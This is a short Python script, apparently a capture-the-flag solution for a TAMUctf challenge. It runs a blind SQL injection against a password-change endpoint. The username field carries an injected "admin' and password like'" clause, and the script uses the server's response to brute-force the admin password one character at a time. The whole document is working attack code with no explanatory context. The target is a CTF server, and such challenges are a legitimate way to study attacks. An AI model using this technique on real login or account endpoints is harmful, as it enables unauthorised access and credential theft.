import requests
import string
a=string.digits+string.ascii_lowercase+"}{_-"
url="http://logical.tamuctf.com/api/chpass"
b=""
while True:
    for i in a:
        data={"username":"admin' and password like'"+b+i+"%"}
        r=requests.post(url,data=data)
        if "not exists" not in r.text:
            b+=i
            print(b)
            break
